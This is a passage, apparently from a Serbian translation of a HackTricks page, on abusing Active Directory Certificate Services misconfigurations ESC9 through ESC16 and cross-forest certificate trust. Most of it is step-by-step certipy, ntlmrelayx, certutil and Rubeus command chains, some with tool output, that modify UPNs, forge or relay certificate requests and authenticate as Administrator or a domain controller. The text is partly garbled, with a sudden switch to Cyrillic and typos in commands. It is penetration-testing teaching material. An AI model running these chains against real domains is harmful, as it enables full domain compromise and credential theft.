Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad `Jane@corp.local`, sa ciljem kompromitovanja `Administrator@corp.local`. `ESC9` šablon sertifikata, za koji `Jane@corp.local` sme da se registruje, je konfigurisan sa `CT_FLAG_NO_SECURITY_EXTENSION` flagom u svom `msPKI-Enrollment-Flag` podešavanju.

U početku se hash `Jane` dobija koristeći Shadow Credentials, zahvaljujući `John`-ovom `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Nakon toga, `userPrincipalName` korisnice `Jane` je izmenjen u `Administrator`, namerno izostavljajući deo domene `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova izmena ne krši ograničenja, s obzirom da `Administrator@corp.local` ostaje različit kao `Administrator`-ov `userPrincipalName`.

Nakon toga, `ESC9` šablon sertifikata, označen kao ranjiv, je zatražen kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Primećeno je da `userPrincipalName` sertifikata prikazuje `Administrator`, bez ikakvog “object SID”.

`userPrincipalName` korisnice `Jane` je potom vraćen na njen originalni, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentifikacije izdatim sertifikatom sada vraća NT hash za `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` zbog toga što sertifikat nema navedenu domenu:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

ESC10 se odnosi na dve vrednosti registarskog ključa na domain controller-u:

- Podrazumevana vrednost za `CertificateMappingMethods` pod `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` je `0x18` (`0x8 | 0x10`), prethodno podešena na `0x1F`.
- Podrazumevano podešavanje za `StrongCertificateBindingEnforcement` pod `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` je `1`, prethodno `0`.

### Slučaj 1

Kada je `StrongCertificateBindingEnforcement` konfigurisano kao `0`.

### Slučaj 2

Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Zloupotreba - slučaj 1

Ako je `StrongCertificateBindingEnforcement` podešeno na `0`, nalog A sa `GenericWrite` privilegijama može biti iskorišćen da kompromituje bilo koji nalog B.

Na primer, ako ima `GenericWrite` privilegije nad `Jane@corp.local`, napadač cilja kompromitovanje `Administrator@corp.local`. Procedura je ista kao kod ESC9, što omogućava upotrebu bilo kojeg certificate template.

Na početku se hash od `Jane` dobija korišćenjem Shadow Credentials, iskorišćavanjem `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `userPrincipalName` korisnice `Jane` je izmenjen u `Administrator`, namerno izostavljajući deo `@corp.local` kako bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga, kao `Jane` je zatražen sertifikat koji omogućava autentifikaciju klijenta, koristeći podrazumevani `User` šablon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnice `Jane` se zatim vraća na izvornu vrednost, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacija sa dobijenim sertifikatom će izbaciti NT hash korisnika `Administrator@corp.local`, što zahteva navođenje domena u komandi zbog odsustva podataka o domenu u sertifikatu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Slučaj zloupotrebe 2

Ako `CertificateMappingMethods` sadrži `UPN` bit zastavicu (`0x4`), nalog A sa `GenericWrite` pravima može kompromitovati bilo koji nalog B koji nema `userPrincipalName` atribut, uključujući mašinske naloge i ugrađeni administratorski nalog domena `Administrator`.

Cilj ovde je kompromitovati `DC$@corp.local`, počevši od pribavljanja hash-a `Jane` putem Shadow Credentials, koristeći `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Vrednost `userPrincipalName` korisnika `Jane` je zatim postavljena na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Za klijentsku autentifikaciju zatražen je sertifikat kao `Jane` koristeći podrazumevani šablon `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnice `Jane` se vraća na izvornu vrednost nakon ovog procesa.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Za autentifikaciju putem Schannel koristi se Certipy-ova opcija `-ldap-shell`, što označava uspeh autentifikacije kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande poput `set_rbcd` omogućavaju Resource-Based Constrained Delegation (RBCD) napade, potencijalno ugrožavajući domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na bilo koji korisnički nalog kojem nedostaje `userPrincipalName` ili kada on ne odgovara `sAMAccountName`-u; podrazumevani nalog `Administrator@corp.local` je posebno poželjan cilj zbog povišenih LDAP privilegija i zato što po podrazumevanju nema `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, to može omogućiti NTLM relay napade bez potpisivanja preko RPC servisa. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Možete koristiti `certipy` da enumerisate da li je `Enforce Encryption for Requests` Disabled i certipy će prikazati `ESC11` ranjivosti.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenarij zloupotrebe

Potrebno je postaviti relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za domain controllers, moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administratori mogu podesiti Certificate Authority da ga skladišti na eksternom uređaju kao što je "Yubico YubiHSM2".

Ako je USB uređaj povezan na CA server preko USB porta, ili putem USB device servera u slučaju da je CA server virtuelna mašina, za Key Storage Provider je potreban autentifikacioni ključ (ponekad nazivan "password") da bi generisao i koristio ključeve u YubiHSM.

Ovaj ključ/lozinka se čuva u registru pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` nešifrovano.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Ako je privatni ključ CA-a pohranjen na fizičkom USB uređaju, kada dobijete shell access, moguće je povratiti ključ.

U prvom koraku, potrebno je pribaviti CA sertifikat (on je javan) i zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na kraju, koristite certutil `-sign` команду да фалсификујете нови произвољни сертификат користећи CA сертификат и његов приватни кључ.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` омогућава да се политика издaвања додa у шаблон сертификата. Објекти `msPKI-Enterprise-Oid` који су одговорни за политике издaвања могу се открити у Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) контејнера PKI OID. Политика може бити повезана са AD групом коришћењем атрибута овог објекта `msDS-OIDToGroupLink`, омогућавајући систему да ауторизује корисника који прикаже сертификат као да је члан те групе. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Другим речима, када корисник има дозволу да затражи издавање сертификата и сертификат је повезан са OID групом, корисник може наследити привилегије те групе.

Користите [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) да пронађете OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenarij zloupotrebe

Pronađite korisničko dopuštenje koje možete iskoristiti pomoću `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu za enroll `VulnerableTemplate`, korisnik može naslediti privilegije grupe `VulnerableGroup`.

Sve što treba da uradi je da navede template, dobiće sertifikat sa OIDToGroupLink pravima.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Ranjiva konfiguracija obnavljanja sertifikata - ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. Ispod sledi citat originalnog teksta.

ESC14 se bavi ranjivostima koje proističu iz "weak explicit certificate mapping", prvenstveno kroz zloupotrebu ili nesigurnu konfiguraciju atributa `altSecurityIdentities` na Active Directory korisničkim ili računarskim nalozima. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhu autentifikacije. Kada je popunjen, ova eksplicitna mapiranja mogu nadjačati podrazumevanu logiku mapiranja sertifikata, koja obično zavisi od UPN-ova ili DNS imena u SAN sertifikata, ili SID-a ugrađenog u sigurnosno proširenje `szOID_NTDS_CA_SECURITY_EXT`.

Do "weak" mapiranja dolazi kada je string vrednost korišćena u atributu `altSecurityIdentities` za identifikaciju sertifikata preširoka, lako pogodiva, zasnovana na nejedinstvenim poljima sertifikata, ili koristi komponente sertifikata koje se lako falsifikuju. Ako napadač može da dobije ili izradi sertifikat čiji atributi odgovaraju takvom slabo definisanom eksplicitnom mapiranju za privilegovani nalog, može iskoristiti taj sertifikat za autentifikaciju i impersonaciju tog naloga.

Primeri potencijalno slabih stringova za mapiranje u `altSecurityIdentities` uključuju:

- Mapiranje isključivo po uobičajenom Subject Common Name (CN): npr., `X509:<S>CN=SomeUser`. Napadač bi mogao da dobije sertifikat sa ovim CN iz manje sigurnog izvora.
- Korišćenje previše generičkih Issuer Distinguished Names (DN) ili Subject DN-ova bez dodatne kvalifikacije kao što su specifičan serijski broj ili subject key identifier: npr., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Korišćenje drugih predvidivih obrazaca ili ne-kriptografskih identifikatora koje bi napadač mogao da zadovolji u sertifikatu koji može legitimno dobiti ili falsifikovati (ako je kompromitovao CA ili pronašao ranjiv template kao u ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapira po punom Issuer i Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (mapira po vrednosti Subject Key Identifier ekstenzije sertifikata)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapira po serijskom broju, implicitno kvalifikovanom Issuer DN-om) - ovo nije standardni format, obično je `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapira po RFC822 imenu, tipično email adresi iz SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapira po SHA1 hešu sirovog javnog ključa sertifikata - generalno snažno)

Bezbednost ovih mapiranja u velikoj meri zavisi od specifičnosti, jedinstvenosti i kriptografske snage izabranih identifikatora sertifikata koji se koriste u stringu za mapiranje. Čak i sa uključenim snažnim režimima vezivanja sertifikata na Domain Controller-ima (koji uglavnom utiču na implicitna mapiranja zasnovana na SAN UPN/DNS i SID ekstenziji), loše konfigurisana `altSecurityIdentities` stavka i dalje može predstavljati direktan put za impersonaciju ako je sama logika mapiranja pogrešna ili previše permisivna.

### Scenarij zloupotrebe

ESC14 cilja **explicit certificate mappings** u Active Directory (AD), tačnije atribut `altSecurityIdentities`. Ako je ovaj atribut postavljen (po dizajnu ili greškom u konfiguraciji), napadači mogu da oponašaju naloge predstavljajući sertifikate koji odgovaraju mapiranju.

#### Scenario A: Napadač može pisati u `altSecurityIdentities`

**Preduslov**: Napadač ima dozvole za pisanje na atribut `altSecurityIdentities` ciljnog naloga ili ima dozvolu da to dodeli u vidu jedne od sledećih dozvola na ciljnom AD objektu:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Cilj ima slabo mapiranje putem X509RFC822 (Email)

- **Preduslov**: Cilj ima slabo X509RFC822 mapiranje u `altSecurityIdentities`. Napadač može da postavi mail atribut žrtve da odgovara X509RFC822 imenu cilja, registruje sertifikat kao žrtva i koristi ga za autentifikaciju kao cilj.

#### Scenario C: Cilj ima X509IssuerSubject mapiranje

- **Preduslov**: Cilj ima slabo X509IssuerSubject eksplicitno mapiranje u `altSecurityIdentities`. Napadač može da postavi `cn` ili `dNSHostName` atribut na žrtvinom principal-u da odgovara subject-u X509IssuerSubject mapiranja cilja. Zatim napadač može da registruje sertifikat kao žrtva i koristi taj sertifikat za autentifikaciju kao cilj.

#### Scenario D: Cilj ima X509SubjectOnly mapiranje

- **Preduslov**: Cilj ima slabo X509SubjectOnly eksplicitno mapiranje u `altSecurityIdentities`. Napadač može da postavi `cn` ili `dNSHostName` atribut na žrtvinom principal-u da odgovara subject-u X509SubjectOnly mapiranja cilja. Zatim napadač može da registruje sertifikat kao žrtva i koristi taj sertifikat za autentifikaciju kao cilj.

### konkretne operacije
#### Scenario A

Zatražite sertifikat iz šablona sertifikata `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sačuvajte i konvertujte sertifikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autentifikujte se (koristeći sertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Čišćenje (opciono)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

Opis na https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc je izuzetno detaljan. Ispod je citat originalnog teksta.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Zloupotreba

Sledeće se odnosi na [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.


Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenarij A: Direct Impersonation via Schannel

**Korak 1: Zatražite sertifikat, ubacujući "Client Authentication" Application Policy i ciljani UPN.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći "WebServer" V1 template (koji dozvoljava enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: The vulnerable V1 template with "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u Application Policies ekstenziju CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN radi lažnog predstavljanja.

**Korak 2: Autentifikujte se preko Schannel (LDAPS) koristeći dobijeni sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenarij B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Korak 1: Zatražite sertifikat iz V1 template-a (sa "Enrollee supplies subject"), ubacujući "Certificate Request Agent" Application Policy.** Ovaj sertifikat služi da napadač (`attacker@corp.local`) postane enrollment agent. Ovde nije naveden UPN za napadačev identitet, jer je cilj ovlašćenje agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Ubacuje OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Iskoristite "agent" sertifikat da zatražite sertifikat u ime ciljanog privilegovanog korisnika.** Ovo je ESC3-like korak, pri čemu se koristi sertifikat iz Koraka 1 kao agent sertifikat.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći "on-behalf-of" sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Onemogućena bezbednosna ekstenzija na CA (globalno) - ESC16

### Objašnjenje

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi se na scenarij u kome, ako konfiguracija Active Directory Certificate Services (AD CS) ne nameće uključivanje ekstenzije **szOID_NTDS_CA_SECURITY_EXT** u svim sertifikatima, napadač to može iskoristiti na sledeći način:

1. Zahtevajući sertifikat **bez SID bindinga**.

2. Korišćenjem ovog sertifikata **za autentifikaciju kao bilo koji nalog**, na primer imitirajući nalog sa visokim privilegijama (npr. Domain Administrator).

Takođe možete pogledati ovaj članak da saznate više o detaljnom principu: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Zloupotreba

Sledeće se odnosi na [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), kliknite da vidite detaljnije metode upotrebe.

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) ranjivo na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Korak 1: Pročitajte početni UPN naloga žrtve (Neobavezno - za obnavljanje).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Korak 2: Ažurirajte UPN naloga žrtve na `sAMAccountName` ciljanog administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Korak 3: (ako je potrebno) Nabavite kredencijale za nalog „žrtve” (npr. putem Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Korak 4: Zatražite sertifikat kao korisnik "victim" iz _any suitable client authentication template_ (npr. "User") na ESC16-vulnerable CA.** Pošto je CA ranjiv na ESC16, automatski će izostaviti SID security extension iz izdatog sertifikata, bez obzira na specifična podešavanja šablona za ovu ekstenziju. Podesite Kerberos credential cache environment variable (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Zatim zatražite sertifikat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Korak 5: Vratite UPN naloga "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Korak 6: Autentifikujte se kao ciljani administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromitovanje forestova pomoću certifikata — objašnjeno u pasivnom obliku

### Kršenje forest trust-ova usled kompromitovanih CA

Konfiguracija za **cross-forest enrollment** učinjena je relativno jednostavnom. **Root CA certificate** iz resource forest-a se od strane administratora **publish-uje u account forests**, a **enterprise CA** certificates iz resource forest-a se **dodaju u `NTAuthCertificates` i AIA containers u svakom account forest-u**. Da se pojasni, ovim aranžmanom se **CA in the resource forest potpuna kontrola** nad svim ostalim forest-ovima za koje upravlja PKI dodeljuje. Ukoliko bi ova CA bila **compromised by attackers**, certifikati za sve korisnike i u resource i u account forests mogli bi biti **forged by them**, čime bi sigurnosna granica forest-a bila prekršena.

### Privilegije enrollment-a dodeljene stranim principal-ima

U okruženjima sa više forest-ova, potrebno je biti oprezan u vezi sa Enterprise CAs koje **publish certificate templates** koji dozvoljavaju **Authenticated Users ili foreign principals** (korisnici/grupe van forest-a kojem Enterprise CA pripada) **enrollment and edit rights**.\
Prilikom autentikacije preko trust-a, AD dodaje **Authenticated Users SID** u token korisnika. Dakle, ako domen poseduje Enterprise CA sa template-om koji **allows Authenticated Users enrollment rights**, template bi potencijalno mogao biti **enrolled in by a user from a different forest**. Slično, ako su **enrollment rights eksplicitno dodeljena foreign principal-u od strane template-a**, time se kreira **cross-forest access-control relationship**, što omogućava principal-u iz jednog forest-a da **enroll in a template from another forest**.

Oba scenarija dovode do **povećanja attack surface** sa jednog forest-a na drugi. Podešavanja certificate template-a mogu biti iskorišćena od strane napadača da se dobiju dodatne privilegije u foreign domain-u.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
